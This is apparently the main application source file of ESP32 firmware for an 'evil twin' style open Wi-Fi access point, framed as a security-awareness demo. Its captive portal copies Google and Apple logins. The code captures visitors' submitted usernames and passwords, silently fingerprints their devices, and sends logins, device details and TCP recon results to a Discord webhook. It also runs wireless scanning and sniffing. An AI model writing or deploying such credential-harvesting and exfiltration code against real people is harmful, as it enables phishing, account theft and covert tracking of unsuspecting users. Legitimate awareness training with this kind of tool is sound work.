#include "core/App.h"

#include <Arduino.h>

#include <cstring>

#include "security/ConfigValidation.h"
#include "web/WebServer.h"

namespace mak {

namespace {
constexpr uint32_t kUplinkRetryMs = 30000;
}

App::App() : auth_(settings_), discord_(settings_, ap_) {}

void App::publish(EventType type, bool flag, uint16_t count, const char* scenarioId) {
  Event ev(type, flag, count, millis());
  ev.setScenario(scenarioId ? scenarioId : "");
  events_.publish(ev);
  // Espelha no feed ao vivo do Discord (se habilitado + uplink up).
  discord_.notifyEvent(ev);
}

void App::enterErrorSafe(const char* why) {
  state_.transitionTo(State::kErrorSafe);
#if TRAINING_MODE
  Serial.printf("[app] ERROR_SAFE: %s\n", why ? why : "");
#endif
  publish(EventType::kSystem, false, 0, "error_safe");
}

bool App::begin() {
  if (!settings_.begin()) {
    enterErrorSafe("nvs_begin_failed");
    return false;
  }
  state_.transitionTo(State::kConfig);
  publish(EventType::kSystem, true, 0, "boot");

  discord_.begin();
  recon_.begin();

  // Basta a senha do operador: o AP de visitantes é aberto (sem senha de
  // rádio); quem protege o console admin é a senha do operador.
  if (settings_.hasOperatorPassword()) {
    if (!startNetwork()) {
      enterErrorSafe("start_network_failed");
      return false;
    }
  } else {
#if TRAINING_MODE
    Serial.println("[app] Sem senha do operador. Use o console serial:");
    Serial.println("      set-op-pass <senha_forte>   (>=12 chars, 3+ classes)");
    Serial.println("      start                        (sobe AP/portal)");
#endif
  }
  return true;
}

bool App::startNetwork() {
  if (!ap_.beginOpen(settings_.apSsid().c_str())) {
    return false;
  }
  if (!dns_.begin()) {
    return false;
  }
  if (!web_) {
    web_ = new WebServer(*this);
  }
  if (!web_->begin()) {
    return false;
  }
  state_.transitionTo(State::kApReady);
  state_.transitionTo(State::kPortalReady);
  publish(EventType::kSystem, true, 0, "portal_ready");

  if (discord_.enabled() && settings_.uplinkConfigured()) {
    connectUplink();
  }
#if TRAINING_MODE
  Serial.printf("[app] AP '%s' no IP %s — portal em http://%s/portal\n", settings_.apSsid().c_str(),
                ap_.apIpString(), ap_.apIpString());
#endif
  return true;
}

bool App::connectUplink() {
  if (!settings_.uplinkConfigured()) return false;
  reconnectUplink_ = true;
  configTime(0, 0, "pool.ntp.org", "time.cloudflare.com");
  return ap_.startUplink(settings_.uplinkSsid().c_str(),
                         settings_.uplinkPassword().c_str());
}

void App::disconnectUplink() {
  reconnectUplink_ = false;
  ap_.stopUplink();
}

void App::forgetUplink() {
  // Desconecta e apaga o SSID/senha salvos: a rede não reconecta mais sozinha.
  disconnectUplink();
  settings_.clearUplink();
}

// --- Provisionamento --------------------------------------------------------
bool App::provisionOperatorPassword(const char* pw) {
  bool ok = settings_.setOperatorPassword(pw);
  if (ok) publish(EventType::kSystem, true, 0, "op_pass_set");
  return ok;
}
bool App::provisionDiscordWebhook(const char* url) { return settings_.setDiscordWebhook(url); }
bool App::provisionUplink(const char* ssid, const char* pw) {
  return settings_.setUplink(ssid, pw);
}
void App::setDiscordEnabled(bool en) {
  settings_.setDiscordEnabled(en);
  if (en && settings_.uplinkConfigured()) connectUplink();
}

bool App::setApSsid(const char* ssid) {
  if (!settings_.setApSsid(ssid)) return false;
  publish(EventType::kSystem, true, 0, "ap_ssid_set");
  rebootPending_ = true;
  rebootAtMs_ = millis() + 400;
  return true;
}

bool App::setPortalTemplate(const char* id) {
  if (!settings_.setPortalTemplate(id)) return false;
  publish(EventType::kSystem, true, 0, "portal_template_set");
  return true;
}

// --- Ações ------------------------------------------------------------------
bool App::startScenario(const char* id) {
  if (!validation::isAllowedScenario(id)) {
    return false;  // allowlist: nunca executa algo fora da lista
  }
  if (state_.current() == State::kStopped && ap_.isUp()) {
    state_.transitionTo(State::kConfig);
    state_.transitionTo(State::kApReady);
    state_.transitionTo(State::kPortalReady);
  }
  if (state_.current() != State::kPortalReady) {
    return false;  // só inicia a partir do portal pronto
  }
  if (!state_.transitionTo(State::kDemoRunning)) {
    return false;
  }
  std::strncpy(currentScenario_, id, sizeof(currentScenario_) - 1);
  currentScenario_[sizeof(currentScenario_) - 1] = '\0';
  const ScenarioInfo* info = validation::findScenario(id);
  demoStartedMs_ = millis();
  demoAutoStopMs_ = demoStartedMs_ + (info ? info->autoStopMs : cfg::kDemoAutoStopMs);
  telemetry_.scenariosStarted++;
  publish(EventType::kScenarioStart, true, 0, currentScenario_);
  return true;
}

bool App::stopAll(const char* reason) {
  // Publica STOP e preserva resultados para análise/exportação.
  publish(EventType::kScenarioStop, false, 0, reason ? reason : "stop");
  state_.transitionTo(State::kStopped);
  currentScenario_[0] = '\0';
  demoAutoStopMs_ = 0;
  recon_.sniffStop();
  networkTools_.stop();
  // Preserve evidence for projection/download; clearing is a separate action.
  return true;
}

bool App::activateReveal() {
  if (!state_.transitionTo(State::kReveal)) return false;
  telemetry_.reveals++;
  publish(EventType::kReveal, true, 0, currentScenario_);
  return true;
}

bool App::endReveal() { return state_.transitionTo(State::kPortalReady); }

bool App::recordPortalSimulation(const char* provider) {
  if (!provider || (strcmp(provider, "google") && strcmp(provider, "apple"))) return false;
  if (state_.current() != State::kPortalReady && !state_.acceptsDemoInteraction()) return false;
  telemetry_.demoInteractions++;
  publish(EventType::kDemoInteraction, true, 0,
          strcmp(provider, "google") == 0 ? "simulation_google" : "simulation_apple");
  return true;
}

bool App::recordDemoInteraction() {
  if (!state_.acceptsDemoInteraction()) return false;
  telemetry_.demoInteractions++;
  publish(EventType::kDemoInteraction, true, 0, currentScenario_);
  return true;
}

bool App::runWifiScan(WifiScanSummary& out) {
  if (!state_.allowsWirelessScan()) return false;
  out = wifi_.scanOnce();
  telemetry_.wifiScans++;
  publish(EventType::kWifiScan, out.valid, out.networksSeen, "wifi_scan");
  return out.valid;
}

bool App::runBleScan(BleScanSummary& out) {
  if (!state_.allowsWirelessScan()) return false;
  out = ble_.scanOnce();
  telemetry_.bleScans++;
  publish(EventType::kBleScan, out.valid, out.advertisersSeen, "ble_scan");
  // BLE e AP dividem o rádio: desliga o BLE após a varredura para preservar o
  // captive portal (coexistência — plano §1/§6).
  ble_.stop();
  return out.valid;
}

void App::wipeTelemetry() {
  events_.clear();
  telemetry_.wipe();
}

// --- Ferramentas de recon ao vivo ------------------------------------------
size_t App::reconScan() {
  size_t aps = recon_.scanAps();
  recon_.refreshStations();
  publish(EventType::kWifiScan, recon_.scanValid(), (uint16_t)aps, "recon");
  return aps;
}

void App::reconSniff(bool on) {
  if (on) recon_.sniffStart();
  else recon_.sniffStop();
}

const DeviceInfo* App::deviceBySid(const char* sid) const {
  if (!sid || !sid[0]) return nullptr;
  // Do mais recente para o mais antigo: o fingerprint atual vence em recapturas.
  for (size_t i = deviceCount_; i > 0; --i) {
    const DeviceInfo& d = devices_[i - 1];
    if (d.sid[0] && strncmp(d.sid, sid, cfg::kSidLen) == 0) return &d;
  }
  return nullptr;
}

bool App::captureCredential(const char* user, const char* pass, const char* sid,
                            const char* ip) {
  // Aceita em PORTAL_READY (portal pronto) e DEMO_RUNNING, como o /portal/submit
  // original. STOP/REVEAL bloqueiam novos registros.
  if (state_.current() != State::kPortalReady && !state_.acceptsDemoInteraction()) return false;
  size_t idx;
  if (captureCount_ < cfg::kCaptureRingCap) {
    idx = captureCount_++;
  } else {
    // Descarta a captura mais antiga.
    for (size_t i = 1; i < captureCount_; ++i) captures_[i - 1] = captures_[i];
    idx = captureCount_ - 1;
  }
  Capture& c = captures_[idx];
  c.user[0] = c.pass[0] = c.tmpl[0] = c.sid[0] = c.ip[0] = '\0';
  if (user) { strncpy(c.user, user, sizeof(c.user) - 1); c.user[sizeof(c.user) - 1] = '\0'; }
  if (pass) { strncpy(c.pass, pass, sizeof(c.pass) - 1); c.pass[sizeof(c.pass) - 1] = '\0'; }
  if (sid) { strncpy(c.sid, sid, sizeof(c.sid) - 1); c.sid[sizeof(c.sid) - 1] = '\0'; }
  if (ip) { strncpy(c.ip, ip, sizeof(c.ip) - 1); c.ip[sizeof(c.ip) - 1] = '\0'; }
  strncpy(c.tmpl, settings_.portalTemplate().c_str(), sizeof(c.tmpl) - 1);
  c.tmpl[sizeof(c.tmpl) - 1] = '\0';
  c.uptimeMs = millis();
  telemetry_.demoInteractions++;
  // Evento curto no bus (sem payload de credencial). O feed do Discord leva o
  // login em claro e a senha mascarada (cfg::kPasswordMask) — nunca o texto.
  Event ev(EventType::kCredentialCapture, true, 0, millis());
  ev.setScenario(currentScenario_);
  events_.publish(ev);
  // Associa o fingerprint do MESMO aparelho (pelo id de sessão) para que a
  // mensagem de credencial no Discord já saia com o aparelho junto.
  const DeviceInfo* dev = deviceBySid(c.sid);
  char devSummary[160] = "";
  if (dev) {
    snprintf(devSummary, sizeof(devSummary), "%s · %s · %s · tela %s · %s",
             dev->os, dev->browser, dev->device, dev->screen, dev->lang);
  }
  discord_.notifyCredentialCapture(c.user, c.tmpl, dev ? devSummary : nullptr, c.ip);
  return true;
}

bool App::captureDeviceInfo(const DeviceInfo& in) {
  // Mesmo gate das credenciais: aceita em PORTAL_READY e DEMO_RUNNING; STOP e
  // REVEAL bloqueiam novos registros. Coleta silenciosa — só o operador vê.
  if (state_.current() != State::kPortalReady && !state_.acceptsDemoInteraction()) return false;
  // Dedupe por id de sessão: recarga da MESMA aba (comum em captive portals)
  // atualiza o registro no lugar, sem nova linha nem novo alerta no Discord.
  int existing = -1;
  if (in.sid[0]) {
    for (size_t i = 0; i < deviceCount_; ++i)
      if (devices_[i].sid[0] && strncmp(devices_[i].sid, in.sid, cfg::kSidLen) == 0) {
        existing = (int)i; break;
      }
  }
  bool isNew = (existing < 0);
  size_t idx;
  if (!isNew) {
    idx = (size_t)existing;
  } else if (deviceCount_ < cfg::kDeviceInfoRingCap) {
    idx = deviceCount_++;
  } else {
    // Descarta o fingerprint mais antigo.
    for (size_t i = 1; i < deviceCount_; ++i) devices_[i - 1] = devices_[i];
    idx = deviceCount_ - 1;
  }
  DeviceInfo& d = devices_[idx];
  d = in;  // cópia por valor (buffers de tamanho fixo, já truncados no handler)
  strncpy(d.tmpl, settings_.portalTemplate().c_str(), sizeof(d.tmpl) - 1);
  d.tmpl[sizeof(d.tmpl) - 1] = '\0';
  d.uptimeMs = millis();
  // Recarga da mesma aba só atualiza os dados; não gera evento/alerta novo.
  if (!isNew) return true;
  Event ev(EventType::kDeviceCapture, true, 0, millis());
  ev.setScenario(currentScenario_);
  events_.publish(ev);
  // Feed ao vivo no Discord: resumo legível do fingerprint (dados do navegador,
  // não há credencial envolvida).
  String desc = String("IP (no AP): ") + (d.ip[0] ? d.ip : "?") +
                "\nSO: " + d.os + " · Navegador: " + d.browser +
                "\nAparelho: " + d.device + " · Tela: " + d.screen +
                (d.touch ? " · touch" : "") +
                "\nCPU: " + d.cores + " · RAM: " + d.mem + " · Conexão: " + d.conn +
                " · Bateria: " + d.battery +
                "\nIdioma: " + d.lang + " · Fuso: " + d.tz +
                "\nUA: " + d.ua;
  discord_.notifyText("Fingerprint capturado (portal)", desc.c_str(), 15844367);
  return true;
}

void App::wipeLiveData() {
  recon_.clearProbes();
  recon_.stop();  // zera APs/estações e para o sniffer
  networkTools_.clear();
  dns_.clearQueries();
  for (size_t i = 0; i < cfg::kCaptureRingCap; ++i) captures_[i] = Capture{};
  captureCount_ = 0;
  for (size_t i = 0; i < cfg::kDeviceInfoRingCap; ++i) devices_[i] = DeviceInfo{};
  deviceCount_ = 0;
}

// --- Laço -------------------------------------------------------------------
void App::loop() {
  uint32_t now = millis();
  scheduler_.tick(now);
  dns_.loop();
  if (web_) web_->loop();
  const bool tcpWasRunning = networkTools_.running();
  networkTools_.loop();
  if (tcpWasRunning && !networkTools_.running()) {
    const String summary = networkTools_.summary();
    discord_.notifyText("Recon TCP — resultado", summary.c_str(), 1752220);
    publish(EventType::kSystem, true, 0, "tcp_finished");
  }
  discord_.loop();
  auth_.sweep(now);

  // Trava de segurança: encerra a demo automaticamente após o tempo do cenário.
  if (state_.current() == State::kDemoRunning && demoAutoStopMs_ != 0 &&
      (int32_t)(now - demoAutoStopMs_) >= 0) {
    stopAll("auto_stop");
  }

  // Reboot pendente (ex.: após trocar o SSID do AP).
  if (rebootPending_ && (int32_t)(now - rebootAtMs_) >= 0) {
    ESP.restart();
  }

  // Religa o uplink de telemetria se caiu (sem bloquear).
  static uint32_t lastUplinkTry = 0;
  if (reconnectUplink_ && settings_.uplinkConfigured() && !ap_.uplinkConnected() &&
      (uint32_t)(now - lastUplinkTry) > kUplinkRetryMs) {
    lastUplinkTry = now;
    connectUplink();
  }
}

}  // namespace mak
